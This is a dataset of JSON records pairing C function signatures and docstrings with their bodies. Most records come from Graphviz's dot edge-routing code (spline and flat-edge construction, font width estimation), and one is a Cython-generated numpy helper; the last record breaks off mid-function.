{"docstring": "/* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":963\n *      arr.base = baseptr\n * \n * cdef inline object get_array_base(ndarray arr):             # <<<<<<<<<<<<<<\n *     if arr.base is NULL:\n *         return None\n */\n", "func_signal": "static CYTHON_INLINE PyObject *__pyx_f_5numpy_get_array_base(PyArrayObject *__pyx_v_arr)", "code": "{\n  PyObject *__pyx_r = NULL;\n  int __pyx_t_1;\n  __Pyx_RefNannySetupContext(\"get_array_base\");\n\n  /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":964\n * \n * cdef inline object get_array_base(ndarray arr):\n *     if arr.base is NULL:             # <<<<<<<<<<<<<<\n *         return None\n *     else:\n */\n  __pyx_t_1 = (__pyx_v_arr->base == NULL);\n  if (__pyx_t_1) {\n\n    /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":965\n * cdef inline object get_array_base(ndarray arr):\n *     if arr.base is NULL:\n *         return None             # <<<<<<<<<<<<<<\n *     else:\n *         return <object>arr.base\n */\n    __Pyx_XDECREF(__pyx_r);\n    __Pyx_INCREF(Py_None);\n    __pyx_r = Py_None;\n    goto __pyx_L0;\n    goto __pyx_L3;\n  }\n  /*else*/ {\n\n    /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":967\n *         return None\n *     else:\n *         return <object>arr.base             # <<<<<<<<<<<<<<\n */\n    __Pyx_XDECREF(__pyx_r);\n    __Pyx_INCREF(((PyObject *)__pyx_v_arr->base));\n    __pyx_r = ((PyObject *)__pyx_v_arr->base);\n    goto __pyx_L0;\n  }\n  __pyx_L3:;\n\n  __pyx_r = Py_None; __Pyx_INCREF(Py_None);\n  __pyx_L0:;\n  __Pyx_XGIVEREF(__pyx_r);\n  __Pyx_RefNannyFinishContext();\n  return __pyx_r;\n}", "path": "lowess\\lowess.c", "repo_name": "brentp/bio-playground", "stars": 178, "license": "mit", "language": "c", "size": 1002}
{"docstring": "/* returns count of vertically aligned edges starting at n */\n", "func_signal": "static int straight_len(node_t * n)", "code": "{\n    int cnt = 0;\n    node_t *v;\n\n    v = n;\n    while (1) {\n\tv = aghead(ND_out(v).list[0]);\n\tif (ND_node_type(v) != VIRTUAL)\n\t    break;\n\tif ((ND_out(v).size != 1) || (ND_in(v).size != 1))\n\t    break;\n\tif (ND_coord(v).x != ND_coord(n).x)\n\t    break;\n\tcnt++;\n    }\n    return cnt;\n}", "path": "dotgen\\dotsplines.c", "repo_name": "gyuque/livizjs", "stars": 204, "license": "None", "language": "c", "size": 1904}
{"docstring": "/* transformf:\n * Rotate, if necessary, then translate points.\n */\n", "func_signal": "static pointf\ntransformf (pointf p, pointf del, int flip)", "code": "{\n    if (flip) {\n\tdouble i = p.x;\n\tp.x = p.y;\n\tp.y = -i;\n    }\n    return add_pointf(p, del);\n}", "path": "dotgen\\dotsplines.c", "repo_name": "gyuque/livizjs", "stars": 204, "license": "None", "language": "c", "size": 1904}
{"docstring": "/* adjustregularpath:\n * make sure the path is wide enough.\n * the % 2 was so that in rank boxes would only be grown if\n * they were == 0 while inter-rank boxes could be stretched to a min\n * width.\n * The list of boxes has three parts: tail boxes, path boxes, and head\n * boxes. (Note that because of back edges, the tail boxes might actually\n * belong to the head node, and vice versa.) fb is the index of the\n * first interrank path box and lb is the last interrank path box.\n * If fb > lb, there are none.\n *\n * The second for loop was added by ek long ago, and apparently is intended\n * to guarantee an overlap between adjacent boxes of at least MINW.\n * It doesn't do this, and the ifdef'ed part has the potential of moving \n * a box within a node for more complex paths.\n */\n", "func_signal": "static void adjustregularpath(path * P, int fb, int lb)", "code": "{\n    boxf *bp1, *bp2;\n    int i, x;\n\n    for (i = fb-1; i < lb+1; i++) {\n\tbp1 = &P->boxes[i];\n\tif ((i - fb) % 2 == 0) {\n\t    if (bp1->LL.x >= bp1->UR.x) {\n\t\tx = (bp1->LL.x + bp1->UR.x) / 2;\n\t\tbp1->LL.x = x - HALFMINW, bp1->UR.x = x + HALFMINW;\n\t    }\n\t} else {\n\t    if (bp1->LL.x + MINW > bp1->UR.x) {\n\t\tx = (bp1->LL.x + bp1->UR.x) / 2;\n\t\tbp1->LL.x = x - HALFMINW, bp1->UR.x = x + HALFMINW;\n\t    }\n\t}\n    }\n    for (i = 0; i < P->nbox - 1; i++) {\n\tbp1 = &P->boxes[i], bp2 = &P->boxes[i + 1];\n\tif (i >= fb && i <= lb && (i - fb) % 2 == 0) {\n\t    if (bp1->LL.x + MINW > bp2->UR.x)\n\t\tbp2->UR.x = bp1->LL.x + MINW;\n\t    if (bp1->UR.x - MINW < bp2->LL.x)\n\t\tbp2->LL.x = bp1->UR.x - MINW;\n\t} else if (i + 1 >= fb && i < lb && (i + 1 - fb) % 2 == 0) {\n\t    if (bp1->LL.x + MINW > bp2->UR.x)\n\t\tbp1->LL.x = bp2->UR.x - MINW;\n\t    if (bp1->UR.x - MINW < bp2->LL.x)\n\t\tbp1->UR.x = bp2->LL.x + MINW;\n\t} \n    }\n}", "path": "dotgen\\dotsplines.c", "repo_name": "gyuque/livizjs", "stars": 204, "license": "None", "language": "c", "size": 1904}
{"docstring": "/* makeBottomFlatEnd;\n */\n", "func_signal": "static void\nmakeBottomFlatEnd (spline_info_t* sp, path* P, node_t* n, edge_t* e, \n\tpathend_t* endp, boolean isBegin)", "code": "{\n    boxf b;\n    graph_t* g = agraphof(n);\n\n    b = endp->nb = maximal_bbox(sp, n, NULL, e);\n    endp->sidemask = BOTTOM;\n    if (isBegin) beginpath(P, e, FLATEDGE, endp, FALSE);\n    else endpath(P, e, FLATEDGE, endp, FALSE);\n    b.UR.y = endp->boxes[endp->boxn - 1].UR.y;\n    b.LL.y = endp->boxes[endp->boxn - 1].LL.y;\n    b = makeregularend(b, BOTTOM, ND_coord(n).y - GD_rank(g)[ND_rank(n)].ht2);\n    if (b.LL.x < b.UR.x && b.LL.y < b.UR.y)\n\tendp->boxes[endp->boxn++] = b;\n}", "path": "dotgen\\dotsplines.c", "repo_name": "gyuque/livizjs", "stars": 204, "license": "None", "language": "c", "size": 1904}
{"docstring": "/* _dot_splines:\n * Main spline routing code.\n * The normalize parameter allows this function to be called by the\n * recursive call in make_flat_edge without normalization occurring,\n * so that the edge will only be normalized once in the top level call\n * of dot_splines.\n */\n", "func_signal": "static void _dot_splines(graph_t * g, int normalize)", "code": "{\n    int i, j, k, n_nodes, n_edges, ind, cnt;\n    node_t *n;\n    edge_t fwdedgea, fwdedgeb;\n    edge_t *e, *e0, *e1, *ea, *eb, *le0, *le1, **edges;\n    path *P;\n    spline_info_t sd;\n#ifndef WITH_CGRAPH\n    int et = EDGE_TYPE(g);\n#else /* WITH_CGRAPH */\n    int et = EDGE_TYPE(g);\n#endif /* WITH_CGRAPH */\n\n    if (et == ET_NONE) return; \n#ifdef ORTHO\n    if (et == ET_ORTHO) {\n\tresetRW (g);\n\tif (GD_has_labels(g) & EDGE_LABEL) {\n\t    setEdgeLabelPos (g);\n\t    orthoEdges (g, 1);\n\t}\n\telse\n\t    orthoEdges (g, 0);\n\tgoto finish;\n    } \n#endif\n\n    mark_lowclusters(g);\n    routesplinesinit();\n    P = NEW(path);\n    /* FlatHeight = 2 * GD_nodesep(g); */\n    sd.Splinesep = GD_nodesep(g) / 4;\n    sd.Multisep = GD_nodesep(g);\n    edges = N_NEW(CHUNK, edge_t *);\n\n    /* compute boundaries and list of splines */\n    sd.LeftBound = sd.RightBound = 0;\n    n_edges = n_nodes = 0;\n    for (i = GD_minrank(g); i <= GD_maxrank(g); i++) {\n\tn_nodes += GD_rank(g)[i].n;\n\tif ((n = GD_rank(g)[i].v[0]))\n\t    sd.LeftBound = MIN(sd.LeftBound, (ND_coord(n).x - ND_lw(n)));\n\tif (GD_rank(g)[i].n && (n = GD_rank(g)[i].v[GD_rank(g)[i].n - 1]))\n\t    sd.RightBound = MAX(sd.RightBound, (ND_coord(n).x + ND_rw(n)));\n\tsd.LeftBound -= MINW;\n\tsd.RightBound += MINW;\n\n\tfor (j = 0; j < GD_rank(g)[i].n; j++) {\n\t    n = GD_rank(g)[i].v[j];\n\t\t/* if n is the label of a flat edge, copy its position to\n\t\t * the label.\n\t\t */\n\t    if (ND_alg(n)) {\n\t\tedge_t* fe = (edge_t*)ND_alg(n);\n\t\tassert (ED_label(fe));\n\t\tED_label(fe)->pos = ND_coord(n);\n\t\tED_label(fe)->set = TRUE;\n\t    }\n\t    if ((ND_node_type(n) != NORMAL) &&\n\t\t(sinfo.splineMerge(n) == FALSE))\n\t\tcontinue;\n\t    for (k = 0; (e = ND_out(n).list[k]); k++) {\n\t\tif ((ED_edge_type(e) == FLATORDER)\n\t\t    || (ED_edge_type(e) == IGNORED))\n\t\t    continue;\n\t\tsetflags(e, REGULAREDGE, FWDEDGE, MAINGRAPH);\n\t\tedges[n_edges++] = e;\n\t\tif (n_edges % CHUNK == 0)\n\t\t    GROWEDGES;\n\t    }\n\t    if (ND_flat_out(n).list)\n\t\tfor (k = 0; (e = ND_flat_out(n).list[k]); k++) {\n\t\t    setflags(e, FLATEDGE, 0, AUXGRAPH);\n\t\t    edges[n_edges++] = e;\n\t\t    if (n_edges % CHUNK == 0)\n\t\t\tGROWEDGES;\n\t\t}\n\t    if (ND_other(n).list) {\n\t\t/* In position, each node has its rw stored in mval and,\n                 * if a node is part of a loop, rw may be increased to\n                 * reflect the loops and associated labels. We restore\n                 * the original value here. \n                 */\n\t\tif (ND_node_type(n) == NORMAL) {\n\t\t    double tmp = ND_rw(n);\n\t\t    ND_rw(n) = ND_mval(n);\n\t\t    ND_mval(n) = tmp;\n\t\t}\n\t\tfor (k = 0; (e = ND_other(n).list[k]); k++) {\n\t\t    setflags(e, 0, 0, AUXGRAPH);\n\t\t    edges[n_edges++] = e;\n\t\t    if (n_edges % CHUNK == 0)\n\t\t\tGROWEDGES;\n\t\t}\n\t    }\n\t}\n    }\n\n    /* Sort so that equivalent edges are contiguous. \n     * Equivalence should basically mean that 2 edges have the\n     * same set {(tailnode,tailport),(headnode,headport)}, or\n     * alternatively, the edges would be routed identically if\n     * routed separately.\n     */\n    qsort((char *) &edges[0], n_edges, sizeof(edges[0]),\n\t  (qsort_cmpf) edgecmp);\n\n    /* FIXME: just how many boxes can there be? */\n    P->boxes = N_NEW(n_nodes + 20 * 2 * NSUB, boxf);\n    sd.Rank_box = N_NEW(i, boxf);\n\n    if (et == ET_LINE) {\n    /* place regular edge labels */\n\tfor (n = GD_nlist(g); n; n = ND_next(n)) {\n\t    if ((ND_node_type(n) == VIRTUAL) && (ND_label(n))) {\n\t\tplace_vnlabel(n);\n\t    }\n\t}\n    }\n\n    for (i = 0; i < n_edges;) {\n\tind = i;\n\tle0 = getmainedge((e0 = edges[i++]));\n\tea = (ED_tail_port(e0).defined\n\t      || ED_head_port(e0).defined) ? e0 : le0;\n\tif (ED_tree_index(ea) & BWDEDGE) {\n\t    MAKEFWDEDGE(&fwdedgea, ea);\n\t    ea = &fwdedgea;\n\t}\n\tfor (cnt = 1; i < n_edges; cnt++, i++) {\n\t    if (le0 != (le1 = getmainedge((e1 = edges[i]))))\n\t\tbreak;\n\t    if (ED_adjacent(e0)) continue; /* all flat adjacent edges at once */\n\t    eb = (ED_tail_port(e1).defined\n\t\t  || ED_head_port(e1).defined) ? e1 : le1;\n\t    if (ED_tree_index(eb) & BWDEDGE) {\n\t\tMAKEFWDEDGE(&fwdedgeb, eb);\n\t\teb = &fwdedgeb;\n\t    }\n\t    if (portcmp(ED_tail_port(ea), ED_tail_port(eb)))\n\t\tbreak;\n\t    if (portcmp(ED_head_port(ea), ED_head_port(eb)))\n\t\tbreak;\n\t    if ((ED_tree_index(e0) & EDGETYPEMASK) == FLATEDGE\n\t\t&& ED_label(e0) != ED_label(e1))\n\t\tbreak;\n\t    if (ED_tree_index(edges[i]) & MAINGRAPH)\t/* Aha! -C is on */\n\t\tbreak;\n\t}\n\n\tif (agtail(e0) == aghead(e0)) {\n\t    int b, sizey, r;\n\t    n = agtail(e0);\n\t    r = ND_rank(n);\n\t    if (r == GD_maxrank(g)) {\n\t\tif (r > 0)\n\t\t    sizey = ND_coord(GD_rank(g)[r-1].v[0]).y - ND_coord(n).y;\n\t\telse\n\t\t    sizey = ND_ht(n);\n\t    }\n\t    else if (r == GD_minrank(g)) {\n\t\tsizey = ND_coord(n).y - ND_coord(GD_rank(g)[r+1].v[0]).y;\n\t    }\n\t    else {\n\t\tint upy = ND_coord(GD_rank(g)[r-1].v[0]).y - ND_coord(n).y;\n\t\tint dwny = ND_coord(n).y - ND_coord(GD_rank(g)[r+1].v[0]).y;\n\t\tsizey = MIN(upy, dwny);\n\t    }\n\t    makeSelfEdge(P, edges, ind, cnt, sd.Multisep, sizey/2, &sinfo);\n\t    for (b = 0; b < cnt; b++) {\n\t\te = edges[ind+b];\n\t\tif (ED_label(e))\n\t\t    updateBB(g, ED_label(e));\n\t    }\n\t}\n\telse if (ND_rank(agtail(e0)) == ND_rank(aghead(e0))) {\n\t    make_flat_edge(&sd, P, edges, ind, cnt, et);\n\t}\n\telse\n\t    make_regular_edge(&sd, P, edges, ind, cnt, et);\n    }\n\n    /* place regular edge labels */\n    for (n = GD_nlist(g); n; n = ND_next(n)) {\n\tif ((ND_node_type(n) == VIRTUAL) && (ND_label(n))) {\n\t    place_vnlabel(n);\n\t    updateBB(g, ND_label(n));\n\t}\n    }\n\n    /* normalize splines so they always go from tail to head */\n    /* place_portlabel relies on this being done first */\n    if (normalize)\n\tedge_normalize(g);\n\n#ifdef ORTHO\nfinish :\n#endif\n    /* vladimir: place port labels */\n    /* FIX: head and tail labels are not part of cluster bbox */\n    if (E_headlabel || E_taillabel) {\n\tfor (n = agfstnode(g); n; n = agnxtnode(g, n)) {\n\t    if (E_headlabel) {\n\t\tfor (e = agfstin(g, n); e; e = agnxtin(g, e))\n\t\t    if (ED_head_label(e)) {\n\t\t\tplace_portlabel(e, TRUE);\n\t\t\tupdateBB(g, ED_head_label(e));\n\t\t    }\n\t    }\n\t    if (E_taillabel) {\n\t\tfor (e = agfstout(g, n); e; e = agnxtout(g, e)) {\n\t\t    if (ED_tail_label(e)) {\n\t\t\tplace_portlabel(e, FALSE);\n\t\t\tupdateBB(g, ED_tail_label(e));\n\t\t    }\n\t\t}\n\t    }\n\t}\n    }\n    /* end vladimir */\n\n#ifdef ORTHO\n    if (et != ET_ORTHO) {\n#endif\n\tfree(edges);\n\tfree(P->boxes);\n\tfree(P);\n\tfree(sd.Rank_box);\n\troutesplinesterm();\n#ifdef ORTHO\n    } \n#endif\n    State = GVSPLINES;\n}", "path": "dotgen\\dotsplines.c", "repo_name": "gyuque/livizjs", "stars": 204, "license": "None", "language": "c", "size": 1904}
{"docstring": "/* aghtmlstr:\n * Return true if s is an HTML string.\n * We assume s points to the datafield s[0] of a refstr.\n */\n", "func_signal": "int aghtmlstr(char *s)", "code": "{\n    refstr_t *key;\n\n    if ((StringDict == NULL) || (s == NULL))\n\treturn 0;\n    key = (refstr_t *) (s - offsetof(refstr_t, s[0]));\n    return (key->refcnt & HTML_BIT);\n}", "path": "graph\\refstr.c", "repo_name": "gyuque/livizjs", "stars": 204, "license": "None", "language": "c", "size": 1904}
{"docstring": "/* resetRW:\n * In position, each node has its rw stored in mval and,\n * if a node is part of a loop, rw may be increased to\n * reflect the loops and associated labels. We restore\n * the original value here. \n */\n", "func_signal": "static void\nresetRW (graph_t * g)", "code": "{\n    node_t* n;\n\n    for (n = agfstnode(g); n; n = agnxtnode(g,n)) {\n\tif (ND_other(n).list) {\n\t    double tmp = ND_rw(n);\n\t    ND_rw(n) = ND_mval(n);\n\t    ND_mval(n) = tmp;\n\t}\n    }\n}", "path": "dotgen\\dotsplines.c", "repo_name": "gyuque/livizjs", "stars": 204, "license": "None", "language": "c", "size": 1904}
{"docstring": "/* make_flat_edge:\n * Construct flat edges edges[ind...ind+cnt-1]\n * There are 4 main cases:\n *  - all edges between a and b where a and b are adjacent \n *  - one labeled edge\n *  - all non-labeled edges with identical ports between non-adjacent a and b \n *     = connecting bottom to bottom/left/right - route along bottom\n *     = the rest - route along top\n */\n", "func_signal": "static void\nmake_flat_edge(spline_info_t* sp, path * P, edge_t ** edges, int ind, int cnt, int et)", "code": "{\n    node_t *tn, *hn;\n    edge_t fwdedge, *e;\n    int j, i, r;\n    double stepx, stepy, vspace;\n    int tside, hside, pn;\n    pointf *ps;\n    pathend_t tend, hend;\n    graph_t* g;\n\n    /* Get sample edge; normalize to go from left to right */\n    e = edges[ind];\n    if (ED_tree_index(e) & BWDEDGE) {\n\tMAKEFWDEDGE(&fwdedge, e);\n\te = &fwdedge;\n    }\n    if (ED_adjacent(edges[ind])) {\n\tmake_flat_adj_edges (P, edges, ind, cnt, e, et);\n\treturn;\n    }\n    if (ED_label(e)) {  /* edges with labels aren't multi-edges */\n\tmake_flat_labeled_edge (sp, P, e, et);\n\treturn;\n    }\n\n    if (et == ET_LINE) {\n\tmakeSimpleFlat (agtail(e), aghead(e), edges, ind, cnt, et);\n\treturn;\n    }\n\n    tside = ED_tail_port(e).side;\n    hside = ED_head_port(e).side;\n    if (((tside == BOTTOM) && (hside != TOP)) ||\n        ((hside == BOTTOM) && (tside != TOP))) {\n\tmake_flat_bottom_edges (sp, P, edges, ind, cnt, e, et == ET_SPLINE);\n\treturn;\n    }\n\n    tn = agtail(e);\n    hn = aghead(e);\n    g = agraphof(tn);\n    r = ND_rank(tn);\n    if (r > 0) {\n\trank_t* prevr;\n\tif (GD_has_labels(g) & EDGE_LABEL)\n\t    prevr = GD_rank(g) + (r-2);\n\telse\n\t    prevr = GD_rank(g) + (r-1);\n\tvspace = ND_coord(prevr->v[0]).y - prevr->ht1 - ND_coord(tn).y - GD_rank(g)[r].ht2;\n    }\n    else {\n\tvspace = GD_ranksep(g);\n    }\n    stepx = ((double)sp->Multisep) / (cnt+1); \n    stepy = vspace / (cnt+1);\n\n    makeFlatEnd (sp, P, tn, e, &tend, TRUE);\n    makeFlatEnd (sp, P, hn, e, &hend, FALSE);\n\n    for (i = 0; i < cnt; i++) {\n\tint boxn;\n\tboxf b;\n\te = edges[ind + i];\n\tboxn = 0;\n\n\tb = tend.boxes[tend.boxn - 1];\n \tboxes[boxn].LL.x = b.LL.x; \n\tboxes[boxn].LL.y = b.UR.y; \n\tboxes[boxn].UR.x = b.UR.x + (i + 1) * stepx;\n\tboxes[boxn].UR.y = b.UR.y + (i + 1) * stepy;\n\tboxn++;\n\tboxes[boxn].LL.x = tend.boxes[tend.boxn - 1].LL.x; \n\tboxes[boxn].LL.y = boxes[boxn-1].UR.y;\n\tboxes[boxn].UR.x = hend.boxes[hend.boxn - 1].UR.x;\n\tboxes[boxn].UR.y = boxes[boxn].LL.y + stepy;\n\tboxn++;\n\tb = hend.boxes[hend.boxn - 1];\n\tboxes[boxn].UR.x = b.UR.x;\n\tboxes[boxn].LL.y = b.UR.y;\n\tboxes[boxn].LL.x = b.LL.x - (i + 1) * stepx;\n\tboxes[boxn].UR.y = boxes[boxn-1].LL.y;\n\tboxn++;\n\n\tfor (j = 0; j < tend.boxn; j++) add_box(P, tend.boxes[j]);\n\tfor (j = 0; j < boxn; j++) add_box(P, boxes[j]);\n\tfor (j = hend.boxn - 1; j >= 0; j--) add_box(P, hend.boxes[j]);\n\n\tif (et == ET_SPLINE) ps = routesplines(P, &pn);\n\telse ps = routepolylines(P, &pn);\n\tif (pn == 0)\n\t    return;\n\tclip_and_install(e, aghead(e), ps, pn, &sinfo);\n\tP->nbox = 0;\n    }\n}", "path": "dotgen\\dotsplines.c", "repo_name": "gyuque/livizjs", "stars": 204, "license": "None", "language": "c", "size": 1904}
{"docstring": "/* make_flat_bottom_edges:\n */\n", "func_signal": "static void\nmake_flat_bottom_edges(spline_info_t* sp, path * P, edge_t ** edges, int \n\tind, int cnt, edge_t* e, int splines)", "code": "{\n    node_t *tn, *hn;\n    int j, i, r;\n    double stepx, stepy, vspace;\n    rank_t* nextr;\n    int pn;\n    pointf *ps;\n    pathend_t tend, hend;\n    graph_t* g;\n\n    tn = agtail(e);\n    hn = aghead(e);\n    g = agraphof(tn);\n    r = ND_rank(tn);\n    if (r < GD_maxrank(g)) {\n\tnextr = GD_rank(g) + (r+1);\n\tvspace = ND_coord(tn).y - GD_rank(g)[r].pht1 -\n\t\t(ND_coord(nextr->v[0]).y + nextr->pht2);\n    }\n    else {\n\tvspace = GD_ranksep(g);\n    }\n    stepx = ((double)(sp->Multisep)) / (cnt+1); \n    stepy = vspace / (cnt+1);\n\n    makeBottomFlatEnd (sp, P, tn, e, &tend, TRUE);\n    makeBottomFlatEnd (sp, P, hn, e, &hend, FALSE);\n\n    for (i = 0; i < cnt; i++) {\n\tint boxn;\n\tboxf b;\n\te = edges[ind + i];\n\tboxn = 0;\n\n\tb = tend.boxes[tend.boxn - 1];\n \tboxes[boxn].LL.x = b.LL.x; \n\tboxes[boxn].UR.y = b.LL.y; \n\tboxes[boxn].UR.x = b.UR.x + (i + 1) * stepx;\n\tboxes[boxn].LL.y = b.LL.y - (i + 1) * stepy;\n\tboxn++;\n\tboxes[boxn].LL.x = tend.boxes[tend.boxn - 1].LL.x; \n\tboxes[boxn].UR.y = boxes[boxn-1].LL.y;\n\tboxes[boxn].UR.x = hend.boxes[hend.boxn - 1].UR.x;\n\tboxes[boxn].LL.y = boxes[boxn].UR.y - stepy;\n\tboxn++;\n\tb = hend.boxes[hend.boxn - 1];\n\tboxes[boxn].UR.x = b.UR.x;\n\tboxes[boxn].UR.y = b.LL.y;\n\tboxes[boxn].LL.x = b.LL.x - (i + 1) * stepx;\n\tboxes[boxn].LL.y = boxes[boxn-1].UR.y;\n\tboxn++;\n\n\tfor (j = 0; j < tend.boxn; j++) add_box(P, tend.boxes[j]);\n\tfor (j = 0; j < boxn; j++) add_box(P, boxes[j]);\n\tfor (j = hend.boxn - 1; j >= 0; j--) add_box(P, hend.boxes[j]);\n\n\tif (splines) ps = routesplines(P, &pn);\n\telse ps = routepolylines(P, &pn);\n\tif (pn == 0)\n\t    return;\n\tclip_and_install(e, aghead(e), ps, pn, &sinfo);\n\tP->nbox = 0;\n    }\n}", "path": "dotgen\\dotsplines.c", "repo_name": "gyuque/livizjs", "stars": 204, "license": "None", "language": "c", "size": 1904}
{"docstring": "/* makeFlatEnd;\n */\n", "func_signal": "static void\nmakeFlatEnd (spline_info_t* sp, path* P, node_t* n, edge_t* e, pathend_t* endp,\n             boolean isBegin)", "code": "{\n    boxf b;\n    graph_t* g = agraphof(n);\n\n    b = endp->nb = maximal_bbox(sp, n, NULL, e);\n    endp->sidemask = TOP;\n    if (isBegin) beginpath(P, e, FLATEDGE, endp, FALSE);\n    else endpath(P, e, FLATEDGE, endp, FALSE);\n    b.UR.y = endp->boxes[endp->boxn - 1].UR.y;\n    b.LL.y = endp->boxes[endp->boxn - 1].LL.y;\n    b = makeregularend(b, TOP, ND_coord(n).y + GD_rank(g)[ND_rank(n)].ht2);\n    if (b.LL.x < b.UR.x && b.LL.y < b.UR.y)\n\tendp->boxes[endp->boxn++] = b;\n}", "path": "dotgen\\dotsplines.c", "repo_name": "gyuque/livizjs", "stars": 204, "license": "None", "language": "c", "size": 1904}
{"docstring": "/* estimate_textsize:\n * Estimate width and height of text, for given face and size, in points.\n * Value is stored para->width.\n * NOTE: Tables are based on a font of size 1. Need to multiply by\n * fontsize to get appropriate value.\n */\n", "func_signal": "static void\nestimate_textlayout(graph_t *g, textpara_t * para, char **fontpath)", "code": "{\n    double *Fontwidth;\n    char c, *p, *fp;\n\n    para->width = 0.0;\n    para->height = para->fontsize * LINESPACING;\n    para->yoffset_layout = 0.0;\n    para->yoffset_centerline = 0.1 * para->fontsize;\n    para->layout = para->fontname;\n    para->free_layout = NULL;\n\n    if (!strncasecmp(para->fontname, \"cour\", 4)) {\n\tfp = \"[internal courier]\";\n\tFontwidth = courFontWidth;\n    } else if (!strncasecmp(para->fontname, \"arial\", 5)\n\t       || !strncasecmp(para->fontname, \"helvetica\", 9)) {\n\tfp = \"[internal arial]\";\n\tFontwidth = arialFontWidth;\n    } else {\n\tfp = \"[internal times]\";\n\tFontwidth = timesFontWidth;\n    }\n    if (fontpath)\n\t*fontpath = fp;\n    if ((p = para->str)) {\n\twhile ((c = *p++))\n\t    para->width += Fontwidth[(unsigned char) c];\n\tpara->width *= para->fontsize;\n    }\n}", "path": "common\\fontmetrics.c", "repo_name": "gyuque/livizjs", "stars": 204, "license": "None", "language": "c", "size": 1904}
{"docstring": "/* cloneEdge:\n */\n", "func_signal": "static edge_t*\ncloneEdge (graph_t* g, node_t* tn, node_t* hn, edge_t* orig)", "code": "{\n#ifndef WITH_CGRAPH\n    edge_t* e = agedge(g, tn, hn);\n#else /* WITH_CGRAPH */\n    edge_t* e = agedge(g, tn, hn,NULL,1);\n#endif /* WITH_CGRAPH */\n    /* for (; ED_edge_type(orig) != NORMAL; orig = ED_to_orig(orig)); */\n    agcopyattr (orig, e);\n/*\n    if (orig->tail != ND_alg(tn)) {\n\tchar* hdport = agget (orig, HEAD_ID);\n\tchar* tlport = agget (orig, TAIL_ID);\n\tagset (e, TAIL_ID, (hdport ? hdport : \"\"));\n\tagset (e, HEAD_ID, (tlport ? tlport : \"\"));\n    }\n*/\n\n    return e;\n}", "path": "dotgen\\dotsplines.c", "repo_name": "gyuque/livizjs", "stars": 204, "license": "None", "language": "c", "size": 1904}
{"docstring": "/* make_regular_edge:\n */\n", "func_signal": "static void\nmake_regular_edge(spline_info_t* sp, path * P, edge_t ** edges, int ind, int cnt, int et)", "code": "{\n    graph_t *g;\n    node_t *tn, *hn;\n    edge_t fwdedgea, fwdedgeb, fwdedge, *e, *fe, *le, *segfirst;\n    pointf *ps;\n    pathend_t tend, hend;\n    boxf b;\n    int boxn, sl, si, smode, i, j, dx, pn, hackflag, longedge;\n    static pointf* pointfs;\n    static pointf* pointfs2;\n    static int numpts;\n    static int numpts2;\n    int pointn;\n\n    if (!pointfs) {\n\tpointfs = N_GNEW(NUMPTS, pointf);\n   \tpointfs2 = N_GNEW(NUMPTS, pointf);\n\tnumpts = NUMPTS;\n\tnumpts2 = NUMPTS;\n    }\n    sl = 0;\n    e = edges[ind];\n    g = agraphof(agtail(e));\n    hackflag = FALSE;\n    if (ABS(ND_rank(agtail(e)) - ND_rank(aghead(e))) > 1) {\n\tfwdedgea = *e;\n\tif (ED_tree_index(e) & BWDEDGE) {\n\t    MAKEFWDEDGE(&fwdedgeb, e);\n#ifndef WITH_CGRAPH\n\t    fwdedgea.tail = aghead(e);\n\t    fwdedgea.u.tail_port = ED_head_port(e);\n#else /* WITH_CGRAPH */\n\t    agtail(&fwdedgea) = aghead(e);\n\t    ED_tail_port(&fwdedgea) = ED_head_port(e);\n#endif /* WITH_CGRAPH */\n\t} else {\n\t    fwdedgeb = *e;\n#ifndef WITH_CGRAPH\n\t    fwdedgea.tail = e->tail;\n#else /* WITH_CGRAPH */\n\t    agtail(&fwdedgea) = agtail(e);\n#endif /* WITH_CGRAPH */\n\t}\n\tle = getmainedge(e);\n\twhile (ED_to_virt(le))\n\t    le = ED_to_virt(le);\n#ifndef WITH_CGRAPH\n\tfwdedgea.head = aghead(le);\n\tfwdedgea.u.head_port.defined = FALSE;\n\tfwdedgea.u.edge_type = VIRTUAL;\n\tfwdedgea.u.head_port.p.x = fwdedgea.u.head_port.p.y = 0;\n\tfwdedgea.u.to_orig = e;\n#else /* WITH_CGRAPH */\n\taghead(&fwdedgea) = aghead(le);\n\tED_head_port(&fwdedgea).defined = FALSE;\n\tED_edge_type(&fwdedgea) = VIRTUAL;\n\tED_head_port(&fwdedgea).p.x = ED_head_port(&fwdedgea).p.y = 0;\n\tED_to_orig(&fwdedgea) = e;\n#endif /* WITH_CGRAPH */\n\te = &fwdedgea;\n\thackflag = TRUE;\n    } else {\n\tif (ED_tree_index(e) & BWDEDGE) {\n\t    MAKEFWDEDGE(&fwdedgea, e);\n\t    e = &fwdedgea;\n\t}\n    }\n    fe = e;\n\n    /* compute the spline points for the edge */\n\n    if ((et == ET_LINE) && (pointn = makeLineEdge (fe, pointfs, &hn))) {\n    }\n    else {\n\tint splines = et == ET_SPLINE;\n\tboxn = 0;\n\tpointn = 0;\n\tsegfirst = e;\n\ttn = agtail(e);\n\thn = aghead(e);\n\tb = tend.nb = maximal_bbox(sp, tn, NULL, e);\n\tbeginpath(P, e, REGULAREDGE, &tend, spline_merge(tn));\n\tb.UR.y = tend.boxes[tend.boxn - 1].UR.y;\n\tb.LL.y = tend.boxes[tend.boxn - 1].LL.y;\n\tb = makeregularend(b, BOTTOM,\n\t    \t   ND_coord(tn).y - GD_rank(agraphof(tn))[ND_rank(tn)].ht1);\n\tif (b.LL.x < b.UR.x && b.LL.y < b.UR.y)\n\t    tend.boxes[tend.boxn++] = b;\n\tlongedge = 0;\n\tsmode = FALSE, si = -1;\n\twhile (ND_node_type(hn) == VIRTUAL && !sinfo.splineMerge(hn)) {\n\t    longedge = 1;\n\t    boxes[boxn++] = rank_box(sp, g, ND_rank(tn));\n\t    if (!smode\n\t        && ((sl = straight_len(hn)) >=\n\t    \t((GD_has_labels(g) & EDGE_LABEL) ? 4 + 1 : 2 + 1))) {\n\t        smode = TRUE;\n\t        si = 1, sl -= 2;\n\t    }\n\t    if (!smode || si > 0) {\n\t        si--;\n\t        boxes[boxn++] = maximal_bbox(sp, hn, e, ND_out(hn).list[0]);\n\t        e = ND_out(hn).list[0];\n\t        tn = agtail(e);\n\t        hn = aghead(e);\n\t        